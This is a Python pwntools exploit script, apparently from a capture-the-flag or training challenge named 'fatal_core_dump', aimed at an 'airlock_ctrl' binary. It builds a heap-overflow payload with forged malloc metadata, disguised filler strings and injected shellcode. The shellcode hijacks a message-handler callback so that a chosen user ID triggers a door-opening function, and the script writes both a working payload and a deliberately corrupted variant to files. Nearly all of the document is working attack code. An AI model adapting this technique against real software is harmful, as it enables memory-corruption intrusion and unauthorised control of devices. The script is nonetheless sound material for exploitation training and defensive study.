#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
context.binary = EXE_PATH

# HandleSetSuitOccupant
ORIGINAL_FUNCTION_ADDRESS = 0x555555555e7e
# ControlDoor
INJECT_FUNCTION_ADDRESS = 0x555555555269
# message_serialization_buffer
BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
# message_handlers
HANDLERS_ADDRESS = 0x55555555a7c0

# This is the size initially allocated for rx_message_buffer before the bound is increased.
BUFFER_SIZE = 256

# message is 16 byte header + uint32_t user_id
FIXED_MESSAGE_SIZE = 20

# The SDNHandler is 4 bytes SDNMsgType followed by 8 bytes sdn_msg_callback_t. HandleSetSuitOccupant is the first entry.
CALLBACK_HEAP_ADDRESS = HANDLERS_ADDRESS + 4

# offset of user_id in SDNSetSuitOccupantMessage
CHECK_VALUE_OFFSET = 16
CHECK_VALUE = 0x488504f4

DEVICE_ID = 0xae215d67
DOOR_DEVICE_ID = 0xae215e13

SDN_MSG_TYPE_SET_SUIT_OCCUPANT = 10

# 51 is the malloc bookkeeping value. It appears to be the size + 1 including this metadata. The size is 12 * 5 rounded up to the nearest 16 (64) + 16 bytes metadata.
MALLOC_META_SIZE = 16
MALLOC_META_DATA = b'\x00' * 8 + p32(0x51) + b'\x00' * 4

sh = asm(f'''
    push    rbp
    mov     rbp,rsp
    movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
    mov     rbx, rdi
    add     rbx, {CHECK_VALUE_OFFSET}
    cmp     DWORD PTR [rbx], {CHECK_VALUE}
    jne     .L_skip
    push    rdi
    push    rsi
    push    rdx
    push    rax
    movabs  rax, {INJECT_FUNCTION_ADDRESS}
    mov     edi, {DEVICE_ID}
    mov     esi, {DOOR_DEVICE_ID}
    mov     edx, 1
    call    rax
    pop     rax
    mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
    pop     rdx
    pop     rsi
    pop     rdi
    nop
    nop
.L_skip:
    call    rax
    leave
    ret
''') + asm('nop') * (12)

# To align everything the code after the injection function call needs to be 32 bytes
# This is to have enough space for the corruption, but also enough for the normal return call.
# The return call needs at least 3 bytes (call rax, ret), and can easily be 4 with the "leave".
# This means that the cleanup in the attack path needs to be 28 or 29 bytes. At least 16 bytes
# have to be in the attack path, and the other 16 can either be split between the shared cleanup and the attack path.

print(f"Size of injection: {len(sh)}")

if len(sh) > BUFFER_SIZE:
    raise RuntimeError('len(sh) > BUFFER_SIZE')


filler_len = BUFFER_SIZE - len(sh) - FIXED_MESSAGE_SIZE
print(f'Filler len: {filler_len}')

filler_words = [
    b'volume__75______',
    b'tempunitcelsius_',
    b'dispbrgthigh____',
    b'hudalpha85______',
    b'fontsizemedium__',
    b'languageenglish_',
    b'audiobalcenter__',
    b'contrast60______',
    b'beepvol_50______',
    b'suittemp21______',
    b'colrmodedaylight']

filler=b''.join(filler_words[:(int(filler_len/16))]).replace(b'_', b'\x00')
extra_filler = filler_len - len(filler)

filler += asm('nop') * extra_filler

payload = filler
payload += sh
payload += MALLOC_META_DATA
payload += p32(SDN_MSG_TYPE_SET_SUIT_OCCUPANT) + p64(BUFFER_STACK_ADDRESS + filler_len + FIXED_MESSAGE_SIZE)

with open('./bin/hack_good', 'wb') as fd:
    fd.write(payload)


#ndisasm -b64 bin/hack_good
# 000000BD  57                push rdi
# 000000BE  56                push rsi
# 000000BF  48BF675D21AE0000  mov rdi,0xae215d67
#          -0000
# 000000C9  48BE135E21AE0000  mov rsi,0xae215e13
#          -0000
# 000000D3  48C7C201000000    mov rdx,0x1
# 000000DA  FFD0              call rax
# 000000DC  5E                pop rsi
# 000000DD  5F                pop rdi
# 000000DE  48B8E25D55555555  mov rax,0x555555555de2
#          -0000
# 000000E8  48A3E8AA55555555  mov [qword 0x55555555aae8],rax
#          -0000
# 000000F2  48B8E25D55555555  mov rax,0x555555555de2
#          -0000
# 000000FC  FFD0              call rax
# 000000FE  C9                leave
# 000000FF  C3                ret

inject_call = payload.index(b'\xFF\xD0')
corruption_offset = inject_call + 2
corruption_len = 16

end_requirement = payload.index(b'\xFF\xD0', corruption_offset)
available_len = end_requirement - corruption_offset
if available_len < corruption_len:
    raise RuntimeError(f'available_len < corruption_len: {available_len} < {corruption_len}')

corrupt_data = b'bassvolm83______'.replace(b'_', b'\x00')

if len(corrupt_data) != corruption_len:
    raise RuntimeError('len(corrupt_data) != corruption_len')

bad_payload = payload[:corruption_offset] + corrupt_data + payload[corruption_offset + corruption_len:]

with open('./bin/hack_bad', 'wb') as fd:
    fd.write(bad_payload)
